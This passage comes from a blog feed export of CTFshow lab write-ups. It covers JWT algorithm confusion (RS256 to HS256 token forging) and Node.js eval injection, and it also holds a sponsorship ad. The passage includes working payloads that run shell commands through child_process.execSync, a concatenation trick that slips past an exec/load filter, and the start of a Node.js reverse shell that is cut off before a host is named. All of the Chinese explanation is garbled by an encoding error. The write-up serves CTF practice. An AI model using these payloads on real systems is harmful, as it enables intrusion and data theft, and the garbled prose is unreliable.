punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">"flag_here"</span><span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> auth <span class="token operator">=</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>auth<span class="token punctuation">;</span><span class="token keyword">var</span> cert <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'//public/public.key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// get public key</span>jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>auth<span class="token punctuation">,</span> cert<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> decoded</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>decoded<span class="token punctuation">.</span>user<span class="token operator">===</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'you are not admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ä½¿ç”¨äº†RS256åŠ å¯†ï¼Œä½†æ˜¯å…¬ç§é’¥éƒ½å¯ä»¥è®¿é—®åˆ°</p><p>åŒä¸Šå·¥å…·</p><pre class="language-http" data-language="http"><code class="language-http">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3MjIwNjM2OTd9.tUleRykg1PvGpCF1_mpKka0XK0eYp0X68cYVDnexuzy1gHWlEnAtOqSuwSclFSeLqHPGhIuWWCbyMlLuj9H8E-wq2l3GZYIzbiDLjR6C0XDwVQqP2eSgP1E00bSedY-fJtsDD9Jwwk-Xu9sG5Zo56dkoUmo51vXuJimGiVj1HDU</code></pre><h4 id="web350-RS256-HS256"><a href="#web350-RS256-HS256" class="headerlink" title="web350(RS256 -&gt; HS256)"></a>web350(RS256 -&gt; HS256)</h4><p>å¯ä»¥æ ¹æ®å…¬é’¥ï¼Œä¿®æ”¹ç®—æ³•ä» éå¯¹ç§°ç®—æ³•ï¼ˆæ¯”å¦‚RS256ï¼‰ åˆ° å¯¹ç§°å¯†é’¥ç®—æ³•ï¼ˆHS256ï¼‰åŒæ–¹éƒ½ä½¿ç”¨å…¬é’¥éªŒç­¾ï¼Œé¡ºåˆ©ç¯¡æ”¹æ•°æ®</p><p>å½“å…¬é’¥å¯ä»¥æ‹¿åˆ°æ—¶ï¼Œå¦‚æœä½¿ç”¨å¯¹ç§°å¯†ç ï¼Œåˆ™å¯¹é¢ä½¿ç”¨ç›¸åŒçš„å…¬é’¥è¿›è¡Œè§£å¯†ï¼Œå®ç°éªŒç­¾é€šè¿‡</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> privateKey <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\\public.key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// console.log(privateKey);</span><span class="token keyword">var</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">user</span><span class="token operator">:</span> <span class="token string">'admin'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> privateKey<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">'HS256'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<span class="token punctuation">.</span>eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3MjIwNjUxMDl9<span class="token punctuation">.</span>M40dyhCvr5aIUAy_mEqCYJC8TAcbNrx02HOfhl<span class="token operator">-</span><span class="token constant">GRIU</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DKç›¾-CTFersèµåŠ©è®¡åˆ’</title>
      <link href="/2024/07/26/DK%E7%9B%BE/"/>
      <url>/2024/07/26/DK%E7%9B%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="DKç›¾-CTFersèµåŠ©è®¡åˆ’æ¨å¹¿"><a href="#DKç›¾-CTFersèµåŠ©è®¡åˆ’æ¨å¹¿" class="headerlink" title="DKç›¾-CTFersèµåŠ©è®¡åˆ’æ¨å¹¿"></a>DKç›¾-CTFersèµåŠ©è®¡åˆ’æ¨å¹¿</h1><p>CTFerså¯è·å¾—DKç›¾èµåŠ©æœåŠ¡å™¨ï¼Œéå¸¸ä¹‹ç‰©ç¾ä»·å»‰ï¼Œæ¬¢è¿å¸ˆå‚…ä»¬</p><p><strong>å‚ä¸æ¡ä»¶ï¼š</strong></p><ol><li>å‚ä¸è¿‡5ä¸ªä»¥ä¸Šå›½å†…CTFèµ›äº‹ï¼Œé™„ä¸Šç›¸å…³è¯æ˜ã€‚</li><li>æ¯æœˆåœ¨ä¸ªäººæŠ€æœ¯åšå®¢ä¸Šè‡³å°‘æ›´æ–°1ç¯‡åŸåˆ›æ–‡ç« ï¼ˆCTFæŠ€æœ¯ç›¸å…³ï¼‰ï¼Œæ€»é‡10ç¯‡ä»¥ä¸Šã€‚</li><li>åšå®¢åº•éƒ¨æŒ‚æœ‰DKç›¾èµåŠ©æ ‡è¯†æˆ–å‘å¸ƒä¸€ç¯‡æ¨å¹¿æ–‡ç« ã€‚</li></ol><p><strong>ç»­è´¹æ¡ä»¶ï¼š</strong></p><ol><li>æ»¡è¶³ä»¥ä¸Šå‚ä¸æ¡ä»¶çš„ç¬¬2å’Œç¬¬3é¡¹ã€‚</li><li>ç§¯æå‚ä¸CTFèµ›äº‹ã€‚</li><li>æ¯æœˆç»­è´¹1å…ƒã€‚</li></ol><p><strong>å‡çº§æ¡ä»¶ï¼š</strong></p><ol><li>åšå®¢æ–‡ç« æ•°é‡è´¨é‡å’Œèµ›äº‹æ’åæœ‰æ‰€æé«˜</li><li>æ¨å¹¿DKç›¾è½¯æ–‡&#x2F;æµ‹è¯„</li><li>æŒ‰å®é™…éœ€æ±‚</li></ol><p><strong>CTFå›¢é˜Ÿç¦åˆ©ï¼š</strong></p><ul><li>é«˜é˜²CDN</li><li>é«˜é˜²æœºæŸœå…è´¹æ‰˜ç®¡ç­‰</li></ul><h4 id="æ»¡è¶³æ¡ä»¶çš„å¸ˆå‚…å¯ä»¥å»å®˜ç½‘æäº¤å·¥å•å¥¥"><a href="#æ»¡è¶³æ¡ä»¶çš„å¸ˆå‚…å¯ä»¥å»å®˜ç½‘æäº¤å·¥å•å¥¥" class="headerlink" title="æ»¡è¶³æ¡ä»¶çš„å¸ˆå‚…å¯ä»¥å»å®˜ç½‘æäº¤å·¥å•å¥¥"></a>æ»¡è¶³æ¡ä»¶çš„å¸ˆå‚…å¯ä»¥å»å®˜ç½‘æäº¤å·¥å•å¥¥</h4><h3 id="QQ-ç¾¤-727077055"><a href="#QQ-ç¾¤-727077055" class="headerlink" title="QQ ç¾¤: 727077055"></a>QQ ç¾¤: 727077055</h3>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-nodejs</title>
      <link href="/2024/07/25/web%E5%85%A5%E9%97%A8-nodejs/"/>
      <url>/2024/07/25/web%E5%85%A5%E9%97%A8-nodejs/</url>
      
        <content type="html"><![CDATA[<p><a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">ctf-nodejsä¹‹ä¸€äº›å°çŸ¥è¯†</a></p><p><a href="https://xz.aliyun.com/t/7184?time__1311=n4+xnD0Dy737q4Yq7KDsA3rPoGCi1tTttrtO4D">Node.js å¸¸è§æ¼æ´å­¦ä¹ ä¸æ€»ç»“</a></p><h3 id="web334-344"><a href="#web334-344" class="headerlink" title="web334-344"></a>web334-344</h3><h4 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h4><p>æŸ¥çœ‹é™„ä»¶ç»™äº†æºç ï¼Œæ„Ÿè§‰è€ƒäº†ç®€å•çš„ä»£ç å®¡è®¡</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// login.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> users <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../modules/user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>items<span class="token punctuation">;</span> <span class="token keyword">var</span> <span class="token function-variable function">findUser</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> users<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> name<span class="token operator">!==</span><span class="token string">'CTFSHOW'</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>username <span class="token operator">===</span> name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token function">findUser</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">regenerate</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'ç™»å½•å¤±è´¥'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>             req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>loginUser <span class="token operator">=</span> user<span class="token punctuation">.</span>username<span class="token punctuation">;</span>      res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'ç™»å½•æˆåŠŸ'</span><span class="token punctuation">,</span><span class="token literal-property property">ret_flag</span><span class="token operator">:</span>flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'è´¦å·æˆ–å¯†ç é”™è¯¯'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// user.js</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">items</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span><span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">'CTFSHOW'</span><span class="token punctuation">,</span> <span class="token literal-property property">password</span><span class="token operator">:</span> <span class="token string">'123456'</span><span class="token punctuation">&#125;</span>  <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>è¿™é‡Œæœ‰ä¸ªå‘ï¼Œè¿™é‡Œä¸è®©ç›´æ¥ç­‰äºCTFSHOWï¼Œè€Œæ˜¯å¯¹è¾“å…¥çš„nameè¿›è¡Œå¤§å†™åæ¯”è¾ƒï¼Œæ‰€ä»¥<code>name=ctfshow</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> <span class="token function-variable function">findUser</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> users<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> name<span class="token operator">!==</span><span class="token string">'CTFSHOW'</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>username <span class="token operator">===</span> name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><h4 id="web335-child-process-execSync"><a href="#web335-child-process-execSync" class="headerlink" title="web335(child_process.execSync)"></a>web335(child_process.execSync)</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span># <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token operator">:</span> utf<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span># @Author<span class="token operator">:</span> h1xa# @Date<span class="token operator">:</span>   <span class="token number">2020</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">25</span> <span class="token number">03</span><span class="token operator">:</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">21</span># @Last Modified by<span class="token operator">:</span>   h1xa# @Last Modified time<span class="token operator">:</span> <span class="token number">2020</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">25</span> <span class="token number">06</span><span class="token operator">:</span><span class="token number">52</span><span class="token operator">:</span><span class="token number">38</span># @email<span class="token operator">:</span> h1xa@ctfer<span class="token punctuation">.</span>com# @link<span class="token operator">:</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>ctfer<span class="token punctuation">.</span>com<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">></span><span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token constant">CTFFSHOW</span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>    <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span> src<span class="token operator">=</span><span class="token string">"/javascripts/jquery.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span>    where is flag<span class="token operator">?</span>     <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token operator">/</span><span class="token operator">?</span>eval<span class="token operator">=</span> <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></code></pre><p>åœ¨nodejsä¸­ï¼Œeval()æ–¹æ³•ç”¨äºè®¡ç®—å­—ç¬¦ä¸²ï¼Œå¹¶æŠŠå®ƒä½œä¸ºè„šæœ¬ä»£ç æ¥æ‰§è¡Œï¼Œè¯­æ³•ä¸ºâ€œeval(string)â€ï¼›å¦‚æœå‚æ•°ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯æ•´æ•°æˆ–è€…æ˜¯Functionç±»å‹ï¼Œåˆ™ç›´æ¥è¿”å›è¯¥æ•´æ•°æˆ–Functionã€‚</p><p><a href="https://nodejs.cn/api/child_process.html">child_process</a>å…·ä½“ç”¨æ³•</p><p><strong>child_process.execSync(command[, options])</strong></p><p><code>child_process.execSync()</code> æ–¹æ³•é€šå¸¸ä¸ <a href="https://nodejs.cn/api/child_process.html#child_processexeccommand-options-callback"><code>child_process.exec()</code></a> ç›¸åŒï¼Œåªæ˜¯è¯¥æ–¹æ³•åœ¨å­è¿›ç¨‹å®Œå…¨å…³é—­ä¹‹å‰ä¸ä¼šè¿”å›ã€‚å½“é‡åˆ°è¶…æ—¶å¹¶å‘é€ <code>killSignal</code> æ—¶ï¼Œè¯¥æ–¹æ³•å°†åœ¨è¿›ç¨‹å®Œå…¨é€€å‡ºä¹‹å‰ä¸ä¼šè¿”å›ã€‚å¦‚æœå­è¿›ç¨‹æ‹¦æˆªå¹¶å¤„ç†äº† <code>SIGTERM</code> ä¿¡å·æ²¡æœ‰é€€å‡ºï¼Œçˆ¶è¿›ç¨‹ä¼šä¸€ç›´ç­‰åˆ°å­è¿›ç¨‹é€€å‡ºã€‚</p><p>æ‰€ä»¥æ„é€ Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span><span class="token keyword">eval</span><span class="token operator">=</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'child_process'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac fl00g.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token keyword">eval</span><span class="token operator">=</span><span class="token keyword">global</span><span class="token operator">.</span>process<span class="token operator">.</span>mainModule<span class="token operator">.</span>constructor<span class="token operator">.</span><span class="token function">_load</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'child_process'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'calc'</span><span class="token punctuation">)</span></code></pre><h4 id="web336-fs-readFileSync-åå¼¹shell"><a href="#web336-fs-readFileSync-åå¼¹shell" class="headerlink" title="web336(fs.readFileSync  åå¼¹shell)"></a>web336(fs.readFileSync  åå¼¹shell)</h4><p>__filename è¡¨ç¤ºå½“å‰æ­£åœ¨æ‰§è¡Œçš„è„šæœ¬çš„æ–‡ä»¶åã€‚å®ƒå°†è¾“å‡ºæ–‡ä»¶æ‰€åœ¨ä½ç½®çš„ç»å¯¹è·¯å¾„ï¼Œä¸”å’Œå‘½ä»¤è¡Œå‚æ•°æ‰€æŒ‡å®šçš„æ–‡ä»¶åä¸ä¸€å®šç›¸åŒã€‚ å¦‚æœåœ¨æ¨¡å—ä¸­ï¼Œè¿”å›çš„å€¼æ˜¯æ¨¡å—æ–‡ä»¶çš„è·¯å¾„ã€‚ dirname è¡¨ç¤ºå½“å‰æ‰§è¡Œè„šæœ¬æ‰€åœ¨çš„ç›®å½•ã€‚</p><p>æ‰€ä»¥<code>?eval=__filename</code>çœ‹åˆ°æ–‡ä»¶&#x2F;app&#x2F;routes&#x2F;index.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>html<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> evalstring <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>eval<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>evalstring<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>string<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span>amp<span class="token punctuation">;</span><span class="token operator">&amp;</span>amp<span class="token punctuation">;</span> evalstring<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">exec|load</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">)</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>index<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>tql<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>index<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token function">eval</span><span class="token punctuation">(</span>evalstring<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>ç„¶åä¼ å…¥</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readdireSync</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./routes/index.js'</span><span class="token punctuation">)</span></code></pre><p>å¯ä»¥çœ‹åˆ°æºç ï¼Œå‘ç°è¿‡æ»¤äº†<code>exec</code> å’Œ<code>load</code></p><p>å…¶å®å·²ç»å¯ä»¥è¯»æ–‡ä»¶äº†ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¯»flag</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./fl001g.txt'</span><span class="token punctuation">)</span></code></pre><p>å¦å¤–å¯¹äºç¬¬ä¸€æ¬¡çš„Payloadå¯ä»¥ç»•è¿‡æ‰§è¡Œ</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'exe'</span><span class="token operator">%</span>2B<span class="token string">'cSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'tac fl001g.txt'</span><span class="token punctuation">)</span></code></pre><p>å¦å¤–ä¹Ÿå¯ä»¥è¿›è¡Œåå¼¹shell</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> net <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"net"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    cp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    sh <span class="token operator">=</span> cp<span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">net<span class="token punctuation">.</span>Socket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span 